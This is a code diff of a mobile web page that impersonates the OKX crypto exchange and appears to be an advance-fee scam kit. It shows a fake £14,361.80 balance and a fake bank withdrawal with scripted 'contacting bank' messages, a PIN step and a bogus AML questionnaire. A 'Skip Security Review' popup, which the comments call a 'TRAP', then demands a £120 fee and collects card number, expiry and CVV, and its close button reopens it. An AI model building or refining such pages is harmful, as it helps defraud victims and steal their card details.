@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>OKX Pro Dashboard</title>
+    <title>OKX Pro Integrated</title>
     <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
@@ -11,13 +11,12 @@
             --bg-deep: #050505;
             --surface-1: #111111;
             --surface-2: #1c1c1c;
-            --surface-3: #2a2a2a;
             --border-subtle: #333333;
             --text-primary: #ffffff;
             --text-secondary: #888888;
             --accent-green: #00ff9d;
             --accent-red: #ff4d4d;
-            --accent-green-dim: rgba(0, 255, 157, 0.1);
+            --accent-gold: #ffd700;
         }
 
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -31,390 +30,356 @@
             justify-content: center;
             min-height: 100vh;
             overflow-x: hidden;
-            padding-bottom: 90px;
         }
 
-        .container {
-            width: 100%;
-            max-width: 420px;
-            padding: 16px;
-        }
+        /* --- WRAPPERS --- */
+        #app-container { width: 100%; max-width: 420px; position: relative; }
+        
+        /* Views */
+        #view-dashboard { display: block; padding: 16px; padding-bottom: 90px; }
+        #view-transfer { display: none; width: 100%; min-height: 100vh; background: var(--bg-deep); position: absolute; top: 0; left: 0; z-index: 200; padding: 16px;}
 
-        /* --- NAVIGATION --- */
-        .top-nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 0 10px;
-        }
-        .user-pill {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            background: var(--surface-2);
-            padding: 6px 12px;
-            border-radius: 20px;
-            border: 1px solid var(--border-subtle);
-        }
+        /* --- DASHBOARD STYLES --- */
+        .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 10px 0 10px; }
+        .user-pill { display: flex; align-items: center; gap: 10px; background: var(--surface-2); padding: 6px 12px; border-radius: 20px; border: 1px solid var(--border-subtle); }
         .user-avatar { width: 24px; height: 24px; background: #444; border-radius: 50%; }
-        .user-name { font-size: 13px; font-weight: 600; }
-
-        /* --- LIVE TICKER --- */
-        .live-ticker {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            overflow-x: auto;
-            white-space: nowrap;
-            padding: 10px 0 20px;
-            scrollbar-width: none; /* Hide scrollbar Firefox */
-        }
-        .live-ticker::-webkit-scrollbar { display: none; } /* Hide scrollbar Chrome/Safari */
         
-        .ticker-item {
-            display: flex;
-            align-items: baseline;
-            gap: 6px;
-            font-family: 'JetBrains Mono', monospace;
-            background: var(--surface-1);
-            padding: 6px 10px;
-            border-radius: 8px;
-            border: 1px solid var(--border-subtle);
-        }
-        .t-pair { font-size: 11px; font-weight: 700; color: var(--text-secondary); }
-        .t-price { font-size: 12px; font-weight: 600; color: white; transition: color 0.3s; }
-        .t-change { font-size: 10px; }
-        
-        /* Animation Classes */
+        /* Live Ticker */
+        .live-ticker { display: flex; gap: 15px; overflow-x: auto; padding: 10px 0 20px; scrollbar-width: none; }
+        .ticker-item { display: flex; align-items: baseline; gap: 6px; font-family: 'JetBrains Mono'; background: var(--surface-1); padding: 6px 10px; border-radius: 8px; border: 1px solid var(--border-subtle); white-space: nowrap; }
         .flash-up { color: var(--accent-green) !important; }
         .flash-down { color: var(--accent-red) !important; }
-        .text-up { color: var(--accent-green); }
-        .text-down { color: var(--accent-red); }
 
-        /* --- ASSET SECTION --- */
-        .asset-card {
-            background: linear-gradient(145deg, var(--surface-2), var(--surface-1));
-            border: 1px solid var(--border-subtle);
-            border-radius: 20px;
-            padding: 24px;
-            margin-bottom: 20px;
-        }
+        /* Asset Card */
+        .asset-card { background: linear-gradient(145deg, var(--surface-2), var(--surface-1)); border: 1px solid var(--border-subtle); border-radius: 20px; padding: 24px; margin-bottom: 20px; }
+        .main-balance { font-family: 'JetBrains Mono'; font-size: 38px; font-weight: 700; margin: 12px 0; }
         
-        .asset-label { font-size: 12px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; display: flex; justify-content: space-between; }
-        .pnl-badge { color: var(--accent-green); font-family: 'JetBrains Mono', monospace; font-size: 12px; background: var(--accent-green-dim); padding: 2px 6px; border-radius: 4px; }
+        /* Action Grid */
+        .action-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 30px; }
+        .action-item { display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer; }
+        .icon-sq { width: 50px; height: 50px; background: var(--surface-2); border-radius: 14px; display: flex; align-items: center; justify-content: center; border: 1px solid var(--border-subtle); transition: 0.2s; }
+        .action-item:active .icon-sq { border-color: var(--accent-green); color: var(--accent-green); transform: scale(0.95); }
+
+        /* Bottom Nav */
+        .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: rgba(10, 10, 10, 0.95); border-top: 1px solid var(--border-subtle); padding: 12px 20px 30px; display: flex; justify-content: space-between; z-index: 90; }
+        .nav-link { display: flex; flex-direction: column; align-items: center; gap: 4px; color: var(--text-secondary); font-size: 10px; }
+        .nav-link.active { color: white; }
+
+        /* --- TRANSFER FLOW STYLES --- */
+        .header-transfer { display: flex; justify-content: space-between; align-items: center; padding: 10px 0 20px; margin-bottom: 20px; }
+        .btn-back { background: var(--surface-2); border: none; color: white; padding: 8px; border-radius: 50%; cursor: pointer; }
+
+        .input-group { margin-bottom: 20px; }
+        .lbl { font-size: 11px; color: var(--text-secondary); margin-bottom: 8px; display: block; text-transform: uppercase; letter-spacing: 1px; }
+        .inp { background: var(--surface-1); border: 1px solid var(--border-subtle); border-radius: 12px; padding: 16px; color: white; width: 100%; font-family: 'JetBrains Mono'; font-size: 14px; outline: none; }
+        .inp:focus { border-color: var(--accent-green); }
+
+        .btn-main { background: white; color: black; width: 100%; padding: 16px; border-radius: 12px; font-weight: 700; border: none; cursor: pointer; font-size: 16px; margin-top: 20px; }
+
+        /* Full Screen Overlays for Transfer Steps */
+        .step-overlay { position: fixed; inset: 0; background: var(--bg-deep); z-index: 300; display: none; flex-direction: column; padding: 20px; animation: fadeIn 0.3s; }
+        .step-overlay.active { display: flex; }
+        @keyframes fadeIn { from{opacity:0;} to{opacity:1;} }
+
+        /* Loader */
+        .loader-ring { width: 60px; height: 60px; border: 4px solid var(--surface-2); border-top-color: var(--accent-green); border-radius: 50%; animation: spin 1s infinite linear; margin-bottom: 30px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        /* PIN */
+        .pin-grid { display: flex; gap: 15px; justify-content: center; margin: 40px 0; }
+        .pin-box { width: 50px; height: 60px; background: var(--surface-1); border: 1px solid var(--border-subtle); border-radius: 12px; text-align: center; font-size: 24px; color: white; }
+
+        /* Questions */
+        .q-list { overflow-y: auto; padding-bottom: 100px; flex: 1; }
+        .q-item { margin-bottom: 25px; border-bottom: 1px solid var(--border-subtle); padding-bottom: 20px; }
+        .radio-grp { display: flex; flex-direction: column; gap: 10px; margin-top: 10px; }
+        .radio-opt { display: flex; align-items: center; gap: 10px; font-size: 13px; color: #888; }
+
+        /* POPUP TRAP */
+        .paywall-bg { position: fixed; inset: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(10px); z-index: 9999; display: none; align-items: center; justify-content: center; padding: 20px; }
+        .paywall-bg.open { display: flex; }
         
-        .main-balance {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 38px;
-            font-weight: 700;
-            margin: 12px 0;
-            display: flex;
-            align-items: baseline;
-        }
-        .currency-symbol { font-size: 24px; margin-right: 4px; color: var(--text-secondary); }
+        .paywall-card { background: linear-gradient(145deg, #1a1a1a, #0d0d0d); border: 1px solid var(--accent-gold); border-radius: 20px; width: 100%; max-width: 360px; padding: 24px; text-align: center; position: relative; box-shadow: 0 0 50px rgba(255, 215, 0, 0.15); animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes popIn { from{transform:scale(0.8); opacity:0;} to{transform:scale(1); opacity:1;} }
+
+        .close-fake { position: absolute; top: 15px; right: 15px; color: #666; cursor: pointer; }
+        .prem-badge { background: var(--accent-gold); color: #000; font-size: 10px; font-weight: 800; padding: 4px 10px; border-radius: 4px; display: inline-block; margin-bottom: 15px; }
+        .pay-btn { background: var(--accent-gold); color: #000; width: 100%; padding: 14px; border-radius: 10px; font-weight: 700; border: none; margin-top: 20px; cursor: pointer; }
         
-        .asset-meta {
-            display: flex;
-            gap: 15px;
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid var(--border-subtle);
-        }
-        .meta-lbl { font-size: 10px; color: var(--text-secondary); margin-bottom: 4px; }
-        .meta-val { font-family: 'JetBrains Mono', monospace; font-size: 14px; font-weight: 600; }
-
-        /* --- ACTIONS --- */
-        .action-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 12px;
-            margin-bottom: 30px;
-        }
-        .action-item {
-            display: flex; flex-direction: column; align-items: center; gap: 8px;
-            cursor: pointer;
-        }
-        .icon-sq {
-            width: 50px; height: 50px;
-            background: var(--surface-2);
-            border-radius: 14px;
-            display: flex; align-items: center; justify-content: center;
-            border: 1px solid var(--border-subtle);
-            transition: 0.2s;
-        }
-        .action-item:hover .icon-sq { border-color: var(--accent-green); color: var(--accent-green); }
-        .action-label { font-size: 11px; color: var(--text-secondary); font-weight: 500; }
-
-        /* --- CARD DESIGN --- */
-        .card-wrapper {
-            position: relative;
-            width: 100%;
-            height: 220px;
-            border-radius: 16px;
-            overflow: hidden;
-            margin-bottom: 24px;
-            border: 1px solid var(--border-subtle);
-        }
-        .card-img {
-            width: 100%; height: 100%;
-            background-image: url('https://www.dropbox.com/scl/fi/jk7i3xl49fnz5xnfv9m7e/Photo-Dec-25-2025-1-08-50-AM.png?rlkey=qwjndumftnfiswz5t48s69fwz&st=uwj921ij&dl=1');
-            background-size: cover;
-            background-position: center;
-        }
-        .card-overlay-btn {
-            position: absolute; bottom: 16px; right: 16px;
-            background: rgba(0,0,0,0.7);
-            backdrop-filter: blur(8px);
-            border: 1px solid rgba(255,255,255,0.1);
-            color: white; width: 40px; height: 40px; border-radius: 50%;
-            display: grid; place-items: center; cursor: pointer;
-        }
-
-        /* --- TABS & LIST --- */
-        .tab-group { display: flex; gap: 20px; margin-bottom: 16px; }
-        .tab-btn {
-            font-size: 14px; font-weight: 600; color: var(--text-secondary);
-            padding-bottom: 6px; cursor: pointer; position: relative;
-        }
-        .tab-btn.active { color: var(--text-primary); }
-        .tab-btn.active::after {
-            content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; background: var(--accent-green);
-        }
-
-        .tx-item {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 16px; background: var(--surface-1);
-            border: 1px solid var(--border-subtle);
-            border-radius: 12px; margin-bottom: 10px;
-        }
-        .tx-info h4 { margin: 0; font-size: 14px; }
-        .tx-info p { margin: 2px 0 0; font-size: 11px; color: var(--text-secondary); }
-        .tx-amount { font-family: 'JetBrains Mono'; font-size: 14px; font-weight: 600; }
-
-        /* --- MODALS --- */
-        .modal-overlay {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(10px);
-            z-index: 1000; display: none; align-items: flex-end;
-        }
-        .modal-sheet {
-            background: var(--surface-2); width: 100%; border-radius: 24px 24px 0 0;
-            padding: 24px; border-top: 1px solid var(--border-subtle);
-            animation: slideUp 0.3s ease-out;
-        }
-        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-
-        .input-field {
-            background: var(--surface-1); border: 1px solid var(--border-subtle);
-            border-radius: 12px; padding: 14px; color: white; width: 100%;
-            margin-bottom: 16px; font-family: 'JetBrains Mono'; outline: none;
-        }
-        .input-field:focus { border-color: var(--accent-green); }
-
-        .primary-btn {
-            background: var(--text-primary); color: #000;
-            width: 100%; padding: 16px; border-radius: 12px;
-            font-weight: 700; border: none; cursor: pointer;
-        }
-
-        /* --- BOTTOM NAV --- */
-        .bottom-nav {
-            position: fixed; bottom: 0; left: 0; width: 100%;
-            background: rgba(10, 10, 10, 0.95); border-top: 1px solid var(--border-subtle);
-            padding: 12px 20px 30px; display: flex; justify-content: space-between;
-        }
-        .nav-link { display: flex; flex-direction: column; align-items: center; gap: 4px; color: var(--text-secondary); font-size: 10px; cursor: pointer; }
-        .nav-link.active { color: var(--text-primary); }
-
-        .spinner { 
-            width: 30px; height: 30px; border: 3px solid #222; 
-            border-top-color: var(--accent-green); border-radius: 50%; 
-            animation: spin 1s infinite linear; margin: 20px auto;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .cc-form { text-align: left; background: rgba(255,255,255,0.05); padding: 15px; border-radius: 12px; border: 1px solid #333; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="top-nav">
-        <div class="user-pill">
-            <div class="user-avatar"></div>
-            <div class="user-name">Jasvir D.</div>
-        </div>
-        <div style="display:flex; gap:18px;">
-            <i data-lucide="search" size="20"></i>
-            <i data-lucide="bell" size="20"></i>
-        </div>
-    </div>
+<div id="app-container">
 
-    <div class="live-ticker">
-        <div class="ticker-item">
-            <span class="t-pair">BTC</span>
-            <span class="t-price" id="btc-p">98,245.20</span>
-            <span class="t-change text-up" id="btc-c">+1.42%</span>
-        </div>
-        <div class="ticker-item">
-            <span class="t-pair">ETH</span>
-            <span class="t-price" id="eth-p">3,450.15</span>
-            <span class="t-change text-down" id="eth-c">-0.85%</span>
-        </div>
-        <div class="ticker-item">
-            <span class="t-pair">SOL</span>
-            <span class="t-price" id="sol-p">145.80</span>
-            <span class="t-change text-up" id="sol-c">+3.10%</span>
-        </div>
-    </div>
-
-    <div class="asset-card">
-        <div class="asset-label"><span>Total Balance</span> <span class="pnl-badge">+2.4%</span></div>
-        <div class="main-balance"><span class="currency-symbol">£</span>14,361.80</div>
-        <div class="asset-meta">
-            <div><div class="meta-lbl">Available</div><div class="meta-val">£14,361.80</div></div>
-            <div style="margin-left:auto; text-align:right;"><div class="meta-lbl">Equity</div><div class="meta-val">£14,361.80</div></div>
-        </div>
-    </div>
-
-    <div class="action-grid">
-        <div class="action-item"><div class="icon-sq"><i data-lucide="plus"></i></div><span class="action-label">Deposit</span></div>
-        <div class="action-item" onclick="toggleModal(true)"><div class="icon-sq"><i data-lucide="arrow-up-right"></i></div><span class="action-label">Withdraw</span></div>
-        <div class="action-item"><div class="icon-sq"><i data-lucide="arrow-left-right"></i></div><span class="action-label">Transfer</span></div>
-        <div class="action-item"><div class="icon-sq"><i data-lucide="layers"></i></div><span class="action-label">Assets</span></div>
-    </div>
-
-    <div class="card-wrapper">
-        <div class="card-img"></div>
-        <div class="card-overlay-btn" onclick="alert('Card Details: 4539 **** **** 4518')"><i data-lucide="eye" size="18"></i></div>
-    </div>
-
-    <div class="tab-group">
-        <div class="tab-btn active">Transaction History</div>
-        <div class="tab-btn">Orders</div>
-    </div>
-
-    <div class="tx-list">
-        <div class="tx-item">
-            <div style="display:flex; gap:12px; align-items:center;">
-                <div style="background:var(--surface-2); padding:8px; border-radius:8px;"><i data-lucide="arrow-down-left" size="18" color="#00ff9d"></i></div>
-                <div class="tx-info"><h4>GBP Deposit</h4><p>Jan 05, 2026</p></div>
+    <div id="view-dashboard">
+        <div class="top-nav">
+            <div class="user-pill">
+                <div class="user-avatar"></div>
+                <div class="user-name">Jasvir D.</div>
             </div>
-            <div class="tx-amount" style="color:var(--accent-green)">+£5,000.00</div>
-        </div>
-        <div class="tx-item">
-            <div style="display:flex; gap:12px; align-items:center;">
-                <div style="background:var(--surface-2); padding:8px; border-radius:8px;"><i data-lucide="shopping-cart" size="18"></i></div>
-                <div class="tx-info"><h4>Crypto Purchase</h4><p>Jan 04, 2026</p></div>
+            <div style="display:flex; gap:18px;">
+                <i data-lucide="search" size="20"></i>
+                <i data-lucide="bell" size="20"></i>
             </div>
-            <div class="tx-amount">-£1,200.00</div>
         </div>
-    </div>
-</div>
 
-<div id="withdrawModal" class="modal-overlay">
-    <div class="modal-sheet">
-        <div style="display:flex; justify-content:space-between; margin-bottom:24px;">
-            <h2 style="margin:0; font-size:18px;">Withdraw to Bank</h2>
-            <i data-lucide="x" onclick="toggleModal(false)" style="cursor:pointer"></i>
+        <div class="live-ticker">
+            <div class="ticker-item"><span>BTC</span><span id="btc-p">98,245.20</span><span class="flash-up" id="btc-c">+1.4%</span></div>
+            <div class="ticker-item"><span>ETH</span><span id="eth-p">3,450.15</span><span class="flash-down" id="eth-c">-0.8%</span></div>
+            <div class="ticker-item"><span>SOL</span><span id="sol-p">145.80</span><span class="flash-up" id="sol-c">+3.1%</span></div>
+        </div>
+
+        <div class="asset-card">
+            <div style="font-size:12px; color:#888; text-transform:uppercase; display:flex; justify-content:space-between;">
+                <span>Total Balance</span> <span style="color:#00ff9d; background:rgba(0,255,157,0.1); padding:2px 6px; border-radius:4px;">+2.4%</span>
+            </div>
+            <div class="main-balance">£14,361.80</div>
+            <div style="display:flex; gap:15px; border-top:1px solid #333; padding-top:15px; margin-top:15px;">
+                <div><div style="font-size:10px; color:#888;">Available</div><div style="font-family:'JetBrains Mono'; font-weight:600;">£14,361.80</div></div>
+            </div>
+        </div>
+
+        <div class="action-grid">
+            <div class="action-item"><div class="icon-sq"><i data-lucide="plus"></i></div><span style="font-size:11px; color:#888;">Deposit</span></div>
+            <div class="action-item" onclick="startTransferFlow()"><div class="icon-sq"><i data-lucide="arrow-up-right"></i></div><span style="font-size:11px; color:#888;">Withdraw</span></div>
+            <div class="action-item"><div class="icon-sq"><i data-lucide="arrow-left-right"></i></div><span style="font-size:11px; color:#888;">Transfer</span></div>
+            <div class="action-item"><div class="icon-sq"><i data-lucide="layers"></i></div><span style="font-size:11px; color:#888;">Assets</span></div>
         </div>
         
-        <div id="withdrawContent">
-            <label style="font-size:11px; color:var(--text-secondary); margin-bottom:8px; display:block;">BANK NAME</label>
-            <input type="text" id="bName" class="input-field" placeholder="e.g. Barclays">
-            
-            <label style="font-size:11px; color:var(--text-secondary); margin-bottom:8px; display:block;">ACCOUNT NUMBER</label>
-            <input type="tel" class="input-field" placeholder="00000000">
-
-            <label style="font-size:11px; color:var(--text-secondary); margin-bottom:8px; display:block;">AMOUNT (£)</label>
-            <input type="number" id="bAmt" class="input-field" placeholder="0.00">
-
-            <button class="primary-btn" onclick="processWithdraw()">Withdraw Now</button>
+        <div style="font-size:14px; font-weight:600; color:#888; border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:15px;">Recent Activity</div>
+        <div style="display:flex; justify-content:space-between; align-items:center; padding:15px; background:#111; border-radius:12px; margin-bottom:10px; border:1px solid #333;">
+            <div style="display:flex; gap:12px; align-items:center;">
+                <i data-lucide="arrow-down-left" color="#00ff9d"></i>
+                <div><div style="font-weight:600; font-size:14px;">GBP Deposit</div><div style="font-size:11px; color:#888;">Jan 05</div></div>
+            </div>
+            <div style="font-family:'JetBrains Mono'; color:#00ff9d;">+£5,000.00</div>
         </div>
 
-        <div id="loadingState" style="display:none; text-align:center; padding:30px 0;">
-            <div class="spinner"></div>
-            <p id="loadMsg">Processing transfer...</p>
-        </div>
-
-        <div id="successState" style="display:none; text-align:center; padding:20px 0;">
-            <i data-lucide="check-circle" size="48" color="#00ff9d"></i>
-            <h3 style="margin:15px 0 5px;">Transfer Initiated</h3>
-            <p style="color:var(--text-secondary); font-size:13px;">Funds will arrive in your account within 2 hours.</p>
-            <button class="primary-btn" style="margin-top:20px;" onclick="toggleModal(false)">Close</button>
+        <div class="bottom-nav">
+            <div class="nav-link active"><i data-lucide="home"></i><span>Home</span></div>
+            <div class="nav-link"><i data-lucide="bar-chart-2"></i><span>Markets</span></div>
+            <div class="nav-link"><i data-lucide="briefcase"></i><span>Earn</span></div>
+            <div class="nav-link"><i data-lucide="wallet"></i><span>Assets</span></div>
         </div>
     </div>
-</div>
 
-<div class="bottom-nav">
-    <div class="nav-link active"><i data-lucide="home"></i><span>Home</span></div>
-    <div class="nav-link"><i data-lucide="bar-chart-2"></i><span>Markets</span></div>
-    <div class="nav-link"><i data-lucide="arrow-up-down" color="#00ff9d"></i><span>Trade</span></div>
-    <div class="nav-link"><i data-lucide="briefcase"></i><span>Earn</span></div>
-    <div class="nav-link"><i data-lucide="wallet"></i><span>Assets</span></div>
+    <div id="view-transfer">
+        
+        <div id="step-input">
+            <div class="header-transfer">
+                <button class="btn-back" onclick="cancelTransfer()"><i data-lucide="arrow-left"></i></button>
+                <div style="font-weight:600;">Bank Transfer</div>
+                <div style="width:36px;"></div>
+            </div>
+            
+            <div class="input-group">
+                <label class="lbl">Recipient Bank</label>
+                <input type="text" id="in-bank" class="inp" placeholder="e.g. HSBC" value="Barclays">
+            </div>
+            <div class="input-group">
+                <label class="lbl">Sort Code</label>
+                <input type="tel" class="inp" placeholder="00-00-00" value="20-45-12">
+            </div>
+            <div class="input-group">
+                <label class="lbl">Account Number</label>
+                <input type="tel" class="inp" placeholder="00000000" value="88392019">
+            </div>
+            <div class="input-group">
+                <label class="lbl">Amount (£)</label>
+                <input type="number" id="in-amt" class="inp" placeholder="0.00">
+            </div>
+
+            <button class="btn-main" onclick="startProcessing()">Review Transfer</button>
+        </div>
+
+        <div id="step-process" class="step-overlay" style="align-items:center; justify-content:center; text-align:center;">
+            <div class="loader-ring"></div>
+            <div id="process-msg" style="color:#00ff9d; font-family:'JetBrains Mono'; margin-bottom:10px;">Securing transaction...</div>
+            <div id="process-sub" style="color:#888; font-size:12px;">Encrypting data</div>
+        </div>
+
+        <div id="step-pin" class="step-overlay">
+            <div class="header-transfer"><div></div><div style="font-weight:600;">Security</div><div></div></div>
+            <div style="text-align:center; margin-top:20px;">
+                <i data-lucide="shield-lock" size="40" color="#00ff9d"></i>
+                <h2 style="font-size:18px; margin:15px 0 5px;">Set Transaction PIN</h2>
+                <p style="color:#888; font-size:13px; padding:0 20px;">Create a 4-digit code to verify this transfer.</p>
+            </div>
+            <div class="pin-grid">
+                <input type="tel" maxlength="1" class="pin-box" oninput="moveFocus(this)">
+                <input type="tel" maxlength="1" class="pin-box" oninput="moveFocus(this)">
+                <input type="tel" maxlength="1" class="pin-box" oninput="moveFocus(this)">
+                <input type="tel" maxlength="1" class="pin-box" oninput="finishPin()">
+            </div>
+        </div>
+
+        <div id="step-confirm" class="step-overlay">
+            <div style="flex:1; display:flex; flex-direction:column; justify-content:center;">
+                <div style="background:#111; padding:20px; border-radius:16px; border:1px solid #333;">
+                    <label class="lbl">Send To</label>
+                    <div style="font-size:18px; font-weight:600; margin-bottom:15px;" id="conf-bank">Barclays</div>
+                    <label class="lbl">Amount</label>
+                    <div style="font-size:32px; font-weight:700; font-family:'JetBrains Mono'">£<span id="conf-amt">0.00</span></div>
+                </div>
+                <button class="btn-main" onclick="goToQuestions()">Confirm & Send</button>
+            </div>
+        </div>
+
+        <div id="step-questions" class="step-overlay">
+            <div class="header-transfer"><div style="font-weight:600; color:#ff4d4d;">Security Audit</div></div>
+            <p style="font-size:12px; color:#888; margin-bottom:20px;">Mandatory AML Compliance Questionnaire.</p>
+            <div class="q-list" id="q-container"></div>
+            <button class="btn-main" style="background:#333; color:#666;" onclick="alert('Answer all questions.')">Submit</button>
+        </div>
+
+    </div>
+
+    <div id="paywall-modal" class="paywall-bg">
+        <div class="paywall-card">
+            <div class="close-fake" onclick="attemptClosePaywall()"><i data-lucide="x"></i></div>
+            <div class="prem-badge">OKX FAST TRACK</div>
+            <div style="font-size:20px; font-weight:700; margin-bottom:10px;">Skip Security Review</div>
+            <p style="font-size:13px; color:#aaa; line-height:1.5; margin-bottom:20px;">Bypass the audit and processing delays. Enable <strong>Instant Faster Payments</strong>.</p>
+            
+            <div style="display:flex; justify-content:space-between; margin-bottom:15px; align-items:flex-end;">
+                <span style="font-size:12px; color:#888;">Fee</span>
+                <span style="font-size:24px; font-weight:700; color:var(--accent-gold);">£120.00</span>
+            </div>
+
+            <div class="cc-form">
+                <label class="lbl">Card Number</label>
+                <input type="tel" class="inp" placeholder="0000 0000 0000 0000" style="padding:10px; margin-bottom:10px;">
+                <div style="display:flex; gap:10px;">
+                    <input type="tel" class="inp" placeholder="MM/YY" style="padding:10px;">
+                    <input type="tel" class="inp" placeholder="CVV" style="padding:10px;">
+                </div>
+            </div>
+            <button class="pay-btn">Pay & Transfer Instantly</button>
+        </div>
+    </div>
+
 </div>
 
 <script>
     lucide.createIcons();
 
-    // --- MODAL LOGIC ---
-    function toggleModal(show) {
-        const m = document.getElementById('withdrawModal');
-        m.style.display = show ? 'flex' : 'none';
-        if(show) {
-            document.getElementById('withdrawContent').style.display = 'block';
-            document.getElementById('loadingState').style.display = 'none';
-            document.getElementById('successState').style.display = 'none';
+    // --- NAVIGATION FUNCTIONS ---
+    function startTransferFlow() {
+        document.getElementById('view-dashboard').style.display = 'none';
+        document.getElementById('view-transfer').style.display = 'block';
+        document.getElementById('step-input').style.display = 'block';
+    }
+
+    function cancelTransfer() {
+        // Reset and go back home
+        document.getElementById('view-dashboard').style.display = 'block';
+        document.getElementById('view-transfer').style.display = 'none';
+        resetOverlays();
+    }
+
+    function resetOverlays() {
+        document.querySelectorAll('.step-overlay').forEach(el => el.classList.remove('active'));
+    }
+
+    // --- FLOW LOGIC ---
+    function startProcessing() {
+        const amt = document.getElementById('in-amt').value;
+        const bank = document.getElementById('in-bank').value;
+        if(!amt) { alert("Enter amount"); return; }
+        
+        document.getElementById('conf-amt').innerText = parseFloat(amt).toFixed(2);
+        document.getElementById('conf-bank').innerText = bank;
+
+        document.getElementById('step-input').style.display = 'none';
+        document.getElementById('step-process').classList.add('active');
+
+        // Fake Steps
+        const msgs = [
+            {t:"Checking funds...", sub:"Verifying availability"},
+            {t:"Contacting " + bank + "...", sub:"Establishing secure handshake"},
+            {t:"Checking details...", sub:"Validating Sort Code"},
+            {t:"Sending funds...", sub:"Initiating transfer protocol"}
+        ];
+
+        let i = 0;
+        const interval = setInterval(() => {
+            if(i < msgs.length) {
+                document.getElementById('process-msg').innerText = msgs[i].t;
+                document.getElementById('process-sub').innerText = msgs[i].sub;
+                i++;
+            } else {
+                clearInterval(interval);
+                document.getElementById('step-process').classList.remove('active');
+                document.getElementById('step-pin').classList.add('active');
+            }
+        }, 2000); // 2 seconds per step
+    }
+
+    function moveFocus(elem) {
+        if(elem.value.length >= 1) {
+            const next = elem.nextElementSibling;
+            if(next) next.focus();
         }
     }
 
-    function processWithdraw() {
-        const amt = document.getElementById('bAmt').value;
-        if(!amt) return;
-
-        document.getElementById('withdrawContent').style.display = 'none';
-        document.getElementById('loadingState').style.display = 'block';
-        
-        const msg = document.getElementById('loadMsg');
-        setTimeout(() => msg.innerText = "Securing connection...", 1000);
-        setTimeout(() => msg.innerText = "Verifying with bank...", 2500);
-        
+    function finishPin() {
         setTimeout(() => {
-            document.getElementById('loadingState').style.display = 'none';
-            document.getElementById('successState').style.display = 'block';
-        }, 4000);
+            document.getElementById('step-pin').classList.remove('active');
+            document.getElementById('step-confirm').classList.add('active');
+        }, 500);
     }
 
-    // --- LIVE TICKER LOGIC (Simulated) ---
-    const prices = {
-        btc: { val: 98245.20, elP: document.getElementById('btc-p'), elC: document.getElementById('btc-c') },
-        eth: { val: 3450.15, elP: document.getElementById('eth-p'), elC: document.getElementById('eth-c') },
-        sol: { val: 145.80, elP: document.getElementById('sol-p'), elC: document.getElementById('sol-c') }
-    };
+    function goToQuestions() {
+        document.getElementById('step-confirm').classList.remove('active');
+        document.getElementById('step-questions').classList.add('active');
+        generateQuestions();
+        
+        // TRIGGER TRAP AFTER 2 SECONDS
+        setTimeout(() => {
+            document.getElementById('paywall-modal').classList.add('open');
+        }, 2000);
+    }
 
-    function updateTicker() {
-        Object.keys(prices).forEach(key => {
-            const coin = prices[key];
-            const change = (Math.random() * 2 - 1); // Random change between -1 and 1
-            const newVal = coin.val + change;
-            
-            // Update Display
-            coin.elP.innerText = newVal.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
-            
-            // Visual Flash
-            if(newVal > coin.val) {
-                coin.elP.classList.add('flash-up');
-                setTimeout(()=> coin.elP.classList.remove('flash-up'), 500);
-            } else {
-                coin.elP.classList.add('flash-down');
-                setTimeout(()=> coin.elP.classList.remove('flash-down'), 500);
-            }
-            
-            coin.val = newVal;
+    // --- GENERATE QUESTIONS ---
+    function generateQuestions() {
+        const qContainer = document.getElementById('q-container');
+        const qs = [
+            "What is the source of funds?", "Relationship to recipient?", "Is this for crypto trading?",
+            "Did anyone instruct you?", "Are you on a call?", "Is this a lottery win?",
+            "Verified recipient address?", "Is this a loan?", "Funds from joint account?",
+            "Recipient in high-risk country?", "Property deposit?", "Screen sharing active?",
+            "Device remote controlled?", "Understanding unrecoverable nature?", "Data is true?"
+        ];
+        
+        let html = "";
+        qs.forEach((q, i) => {
+            html += `<div class="q-item"><div style="font-weight:600; font-size:13px; margin-bottom:5px;">${i+1}. ${q}</div>
+            <div class="radio-grp">
+                <label class="radio-opt"><input type="radio" name="q${i}"> Yes</label>
+                <label class="radio-opt"><input type="radio" name="q${i}"> No</label>
+            </div></div>`;
         });
+        qContainer.innerHTML = html;
     }
 
-    // Run ticker update every 2.5 seconds
-    setInterval(updateTicker, 2500);
+    // --- TRAP LOGIC ---
+    function attemptClosePaywall() {
+        const m = document.getElementById('paywall-modal');
+        m.classList.remove('open');
+        // RE-OPEN IMMEDIATELY
+        setTimeout(() => { m.classList.add('open'); }, 400); 
+    }
+
+    // --- TICKER SIMULATION ---
+    setInterval(() => {
+        const el = document.getElementById('btc-p');
+        let val = parseFloat(el.innerText.replace(',',''));
+        val += (Math.random() - 0.5) * 50;
+        el.innerText = val.toLocaleString(undefined, {minimumFractionDigits:2});
+    }, 2000);
 
